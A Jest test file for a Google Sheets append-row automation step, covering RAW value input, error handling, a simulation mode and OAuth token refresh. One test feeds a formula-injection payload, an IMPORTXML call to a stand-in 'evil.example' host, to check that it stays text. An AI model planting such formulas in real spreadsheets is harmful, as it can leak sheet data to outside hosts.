/**
 * Google Sheets Append Row through `executeNodeActivity`, with Google's
 * answers faked at the one HTTP seam (`safeHttpRequest`): the append is RAW
 * and in header order, a formula stays text, the row number is read back,
 * 403/404 say to pick the file again, the stand-in counts rows, tokens are
 * refreshed and written back (encrypted by the Prisma store), and a revoked
 * grant marks the connection Needs Reconnect.
 */
import { decrypt } from '@postgear/db';
import { AUTOMATION_FAILURE_TYPES } from '@postgear/scheduling';
import type { SafeHttpOutcome, SafeHttpRequest } from '../../lib/safe-http';
import { buildRegistry, EXECUTORS } from '../executors';
import { createDataExecutors } from '../executors/data';
import type { Executor } from '../executors/types';
import type { MemoryConnection } from '../memory-run-store';
import { PrismaRunStore } from '../prisma-run-store';
import { graphOf, harness, line, NOW, ORG, step, testOptions } from '../testing';
import {
  GOOGLE_DISCONNECTED_MESSAGE,
  GOOGLE_TOKEN_URL,
  googleAccessToken,
  googleClientFromEnv,
} from './google-auth';
import { appendRange, parseRowNumber, resetSimulatedRows, sheetUnavailableMessage } from './sheets';

const REFRESH = 'rt-SECRET-refresh-token-1234567890';
const ACCESS = 'ya29.FRESH-access-token';
const CLIENT = { clientId: 'client-id.apps.googleusercontent.com', clientSecret: 'GOCSPX-secret' };

type FakeHttp = jest.Mock<Promise<SafeHttpOutcome>, [SafeHttpRequest]>;

function ok(body: unknown, statusCode = 200): SafeHttpOutcome {
  return { outcome: 'ok', statusCode, headers: {}, body: JSON.stringify(body), durationMs: 1 };
}

function rejected(statusCode: number, body: unknown): SafeHttpOutcome {
  return {
    outcome: 'rejected',
    statusCode,
    error: `Receiver answered ${statusCode}`,
    body: JSON.stringify(body),
    durationMs: 1,
  };
}

function googleConnection(credentials: unknown): MemoryConnection {
  return {
    id: 'conn_google',
    organizationId: ORG,
    kind: 'google',
    name: 'Bloom Google',
    status: 'CONNECTED',
    credentials,
  };
}

const validToken = () => ({
  refreshToken: REFRESH,
  accessToken: 'ya29.STILL-GOOD',
  expiresAt: NOW.getTime() + 30 * 60_000,
  scope: 'https://www.googleapis.com/auth/drive.file openid email',
  email: 'kim@bloom.example',
});

function sheetsGraph(text = '{{ trigger.inputs.text }}') {
  return graphOf(
    [
      step('trig1', 'trigger.manual', {
        config: { fields: [{ key: 'text', label: 'Text', type: 'text' }] },
      }),
      step('sheet1', 'data.googleSheetsAppendRow', {
        name: 'Log The Post',
        config: {
          connectionId: 'conn_google',
          spreadsheet: { id: '1AbCdEfGhIjK', name: 'Social Report 2026' },
          sheet: { id: 7, title: "Kim's Posts" },
          columns: [
            { header: 'Date', value: '2026-11-03' },
            { header: 'Channel', value: 'Instagram' },
            { header: 'Text', value: text },
            { header: 'Tags', value: '{{ trigger.inputs.tags }}' },
            { header: 'Empty', value: '' },
          ],
        },
      }),
    ],
    [line('trig1', 'sheet1')],
  );
}

function setup(
  options: {
    http?: FakeHttp;
    live?: boolean;
    simulation?: boolean;
    credentials?: unknown;
    text?: string;
    inputText?: string;
  } = {},
) {
  const http: FakeHttp =
    options.http ??
    jest.fn(async (_request: SafeHttpRequest) =>
      ok({ updates: { updatedRange: "'Kim''s Posts'!A42:E42" } }),
    );
  const h = harness(
    sheetsGraph(options.text),
    {
      mode: options.live === false ? 'TEST' : 'LIVE',
      options: testOptions(),
      triggerPayload: {
        inputs: { text: options.inputText ?? '=SUM(A1)', tags: ['launch', 'bakery'] },
      },
    },
    {
      simulation: options.simulation,
      executors: withExecutors(createDataExecutors({ http, googleClient: () => CLIENT })),
    },
  );
  h.store.addConnection(googleConnection(options.credentials ?? validToken()));
  return { h, http };
}

/** The real registry with these executors in place of the ones of the same type. */
function withExecutors(executors: Executor[]) {
  const replaced = new Set(executors.map((executor) => executor.type));
  return buildRegistry([
    ...[...EXECUTORS.values()].filter((executor) => !replaced.has(executor.type)),
    ...executors,
  ]);
}

beforeEach(() => resetSimulatedRows());

describe('the append', () => {
  it('is RAW, adds rows, and sends the values as text in header order', async () => {
    const { h, http } = setup();

    const result = await h.activities.executeNodeActivity(h.stepRef('sheet1'));

    expect(result.status).toBe('succeeded');
    expect(http).toHaveBeenCalledTimes(1);
    const request = http.mock.calls[0][0];
    expect(request.method).toBe('POST');
    expect(request.url).toBe(
      `https://sheets.googleapis.com/v4/spreadsheets/1AbCdEfGhIjK/values/${encodeURIComponent(
        "'Kim''s Posts'!A1",
      )}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`,
    );
    expect(request.headers?.authorization).toBe('Bearer ya29.STILL-GOOD');
    expect(JSON.parse(request.body ?? '')).toEqual({
      values: [['2026-11-03', 'Instagram', '=SUM(A1)', 'launch, bakery', '']],
    });
  });

  it('keeps a formula in a post as text (RAW, never USER_ENTERED)', async () => {
    const { h, http } = setup({ inputText: '=IMPORTXML("https://evil.example","//a")' });
    await h.activities.executeNodeActivity(h.stepRef('sheet1'));
    const request = http.mock.calls[0][0];
    expect(request.url).toContain('valueInputOption=RAW');
    expect(request.url).not.toContain('USER_ENTERED');
    expect(JSON.parse(request.body ?? '').values[0][2]).toBe(
      '=IMPORTXML("https://evil.example","//a")',
    );
  });

  it('gives the next steps the row number, the spreadsheet and the tab', async () => {
    const { h } = setup();
    await h.activities.executeNodeActivity(h.stepRef('sheet1'));
    expect(h.store.latest('run_1', 'sheet1')?.output).toEqual({
      rowNumber: 42,
      spreadsheet: {
        id: '1AbCdEfGhIjK',
        name: 'Social Report 2026',
        url: 'https://docs.google.com/spreadsheets/d/1AbCdEfGhIjK/edit#gid=7',
      },
      sheet: "Kim's Posts",
    });
  });

  it('reads the row number from the updated range', () => {
    expect(parseRowNumber('Posts!A42:F42')).toBe(42);
    expect(parseRowNumber("'My Tab!'!B7:C7")).toBe(7);
    expect(parseRowNumber('Posts!$A$1001:$F$1001')).toBe(1001);
    expect(parseRowNumber('Posts')).toBeNull();
    expect(parseRowNumber(undefined)).toBeNull();
    expect(appendRange("Kim's Posts")).toBe("'Kim''s Posts'!A1");
  });
});

describe('Google refusing', () => {
  it.each([
    [
      403,
      {
        error: {
          code: 403,
          status: 'PERMISSION_DENIED',
          message: 'The caller does not have permission',
        },
      },
    ],
    [
      404,
      { error: { code: 404, status: 'NOT_FOUND', message: 'Requested entity was not found.' } },
    ],
  ])('a %s says to pick the spreadsheet again, and does not retry', async (status, body) => {
    const http: FakeHttp = jest.fn(async (_request: SafeHttpRequest) => rejected(status, body));
    const { h } = setup({ http });

    await expect(h.activities.executeNodeActivity(h.stepRef('sheet1'))).rejects.toMatchObject({
      type: AUTOMATION_FAILURE_TYPES.permanent,
    });
    expect(h.store.latest('run_1', 'sheet1')?.error).toMatchObject({
      code: 'spreadsheet_unavailable',
      message: sheetUnavailableMessage('Social Report 2026'),
      retryable: false,
    });
    expect(sheetUnavailableMessage('Social Report 2026')).toBe(
      'PostGear can no longer open Social Report 2026. Pick it again in this step.',
    );
  });

  it.each([
    [429, 'rate_limited'],
    [503, 'google_unavailable'],
  ])('a %s is worth retrying', async (status, code) => {
    const http: FakeHttp = jest.fn(
      async (_request: SafeHttpRequest): Promise<SafeHttpOutcome> => ({
        outcome: 'retry',
        statusCode: status,
        error: `Receiver answered ${status}`,
        durationMs: 1,
      }),
    );
    const { h } = setup({ http });
    await expect(h.activities.executeNodeActivity(h.stepRef('sheet1'))).rejects.toMatchObject({
      type: AUTOMATION_FAILURE_TYPES.retryable,
    });
    expect(h.store.latest('run_1', 'sheet1')?.error).toMatchObject({ code, retryable: true });
  });
});

describe('the stand-in', () => {
  it('counts rows up per connection under AUTOMATION_SIMULATION, sending nothing', async () => {
    const http: FakeHttp = jest.fn();
    const first = setup({ http, simulation: true });
    await first.h.activities.executeNodeActivity(first.h.stepRef('sheet1'));
    const second = setup({ http, simulation: true });
    await second.h.activities.executeNodeActivity(second.h.stepRef('sheet1'));

    expect(http).not.toHaveBeenCalled();
    expect(first.h.store.latest('run_1', 'sheet1')?.output).toMatchObject({
      rowNumber: 2,
      simulated: true,
    });
    expect(second.h.store.latest('run_1', 'sheet1')?.output).toMatchObject({ rowNumber: 3 });
  });

  it('answers for a simulated connection even without the flag', async () => {
    const http: FakeHttp = jest.fn();
    const { h } = setup({ http, credentials: { simulated: true } });
    await h.activities.executeNodeActivity(h.stepRef('sheet1'));
    expect(http).not.toHaveBeenCalled();
    expect(h.store.latest('run_1', 'sheet1')?.output).toMatchObject({
      rowNumber: 2,
      sheet: "Kim's Posts",
    });
  });

  it('applies failure markers to the row text', async () => {
    const { h } = setup({ simulation: true, inputText: 'Hello [simulate:429]' });
    await expect(h.activities.executeNodeActivity(h.stepRef('sheet1'))).rejects.toMatchObject({
      type: AUTOMATION_FAILURE_TYPES.retryable,
    });
  });
});

describe('dry runs', () => {
  it('say which row would be added, without calling Google', async () => {
    const http: FakeHttp = jest.fn();
    const { h } = setup({ http, live: false, inputText: 'Fresh sourdough' });
    const result = await h.activities.executeNodeActivity(h.stepRef('sheet1'));
    expect(result.status).toBe('dryRun');
    expect(http).not.toHaveBeenCalled();
    expect(h.store.latest('run_1', 'sheet1')?.output).toEqual({
      dryRun: true,
      wouldSend:
        "Would add a row to Social Report 2026, tab Kim's Posts: Date 2026-11-03, Channel Instagram, Text Fresh sourdough, ...",
    });
  });
});

describe('Google tokens', () => {
  const expiring = () => ({
    ...validToken(),
    accessToken: 'ya29.OLD',
    expiresAt: NOW.getTime() + 30_000,
  });

  it('refreshes a token that expires within 60 s and writes it back', async () => {
    const http: FakeHttp = jest.fn(async (request: SafeHttpRequest) =>
      request.url === GOOGLE_TOKEN_URL
        ? ok({ access_token: ACCESS, expires_in: 3599, scope: 'drive.file', token_type: 'Bearer' })
        : ok({ updates: { updatedRange: 'Posts!A3:E3' } }),
    );
    const { h } = setup({ http, credentials: expiring() });

    await h.activities.executeNodeActivity(h.stepRef('sheet1'));

    const refresh = http.mock.calls[0][0];
    expect(refresh.url).toBe('https://oauth2.googleapis.com/token');
    expect(Object.fromEntries(new URLSearchParams(refresh.body))).toEqual({
      grant_type: 'refresh_token',
      refresh_token: REFRESH,
      client_id: CLIENT.clientId,
      client_secret: CLIENT.clientSecret,
    });
    expect(http.mock.calls[1][0].headers?.authorization).toBe(`Bearer ${ACCESS}`);
    expect(h.store.savedCredentials.get('conn_google')).toEqual({
      ...expiring(),
      accessToken: ACCESS,
      expiresAt: NOW.getTime() + 3_599_000,
      scope: 'drive.file',
    });
    // Neither token reaches the step's row.
    const row = JSON.stringify(h.store.latest('run_1', 'sheet1'));
    expect(row).not.toContain(ACCESS);
    expect(row).not.toContain(REFRESH);
  });

  it('marks the connection Needs Reconnect on invalid_grant', async () => {
    const http: FakeHttp = jest.fn(async (_request: SafeHttpRequest) =>
      rejected(400, {
        error: 'invalid_grant',
        error_description: 'Token has been expired or revoked.',
      }),
    );
    const { h } = setup({ http, credentials: expiring() });

    await expect(h.activities.executeNodeActivity(h.stepRef('sheet1'))).rejects.toMatchObject({
      type: AUTOMATION_FAILURE_TYPES.notConnected,
    });
    expect(http).toHaveBeenCalledTimes(1);
    expect(h.store.latest('run_1', 'sheet1')?.error).toMatchObject({
      code: 'google_disconnected',
      message: GOOGLE_DISCONNECTED_MESSAGE,
    });
    expect(h.store.connections[0]).toMatchObject({
      status: 'NEEDS_RECONNECT',
      lastError: GOOGLE_DISCONNECTED_MESSAGE,
    });
  });

  it('says Google is not set up when there is no client to refresh with', async () => {
    const result = await googleAccessToken({
      credentials: expiring(),
      client: null,
      now: NOW,
      http: jest.fn(),
      save: jest.fn(),
    });
    expect(result).toMatchObject({ ok: false, code: 'google_not_set_up', retryable: false });
  });

  it('treats the .env.example placeholders as no client, and falls back to the sign-in app', () => {
    expect(
      googleClientFromEnv({
        GOOGLE_CLIENT_ID: 'google-client-id',
        GOOGLE_CLIENT_SECRET: 'google-client-secret',
      }),
    ).toBeNull();
    expect(
      googleClientFromEnv({ GOOGLE_CLIENT_ID: 'real-id', GOOGLE_CLIENT_SECRET: 'real-secret' }),
    ).toEqual({
      clientId: 'real-id',
      clientSecret: 'real-secret',
    });
    expect(
      googleClientFromEnv({
        GOOGLE_AUTOMATION_CLIENT_ID: 'auto-id',
        GOOGLE_AUTOMATION_CLIENT_SECRET: 'auto-secret',
        GOOGLE_CLIENT_ID: 'real-id',
        GOOGLE_CLIENT_SECRET: 'real-secret',
      }),
    ).toEqual({ clientId: 'auto-id', clientSecret: 'auto-secret' });
  });

  it('stores refreshed credentials encrypted (Prisma store)', async () => {
    const previous = process.env.ENCRYPTION_KEY_AES256;
    process.env.ENCRYPTION_KEY_AES256 = 'c'.repeat(64);
    try {
      const updateMany = jest.fn(async (_request: SafeHttpRequest) => ({ count: 1 }));
      const store = new PrismaRunStore({ automationConnection: { updateMany } } as never);
      const credentials = { ...validToken(), accessToken: ACCESS };
      await store.saveConnectionCredentials(ORG, 'conn_google', credentials);

      const call = (
        updateMany.mock.calls[0] as unknown as [{ where: unknown; data: { credentials: string } }]
      )[0];
      expect(call.where).toEqual({ id: 'conn_google', organizationId: ORG, deletedAt: null });
      expect(call.data.credentials).not.toContain(ACCESS);
      expect(call.data.credentials).not.toContain(REFRESH);
      expect(JSON.parse(decrypt(call.data.credentials))).toEqual(credentials);
    } finally {
      process.env.ENCRYPTION_KEY_AES256 = previous;
    }
  });
});
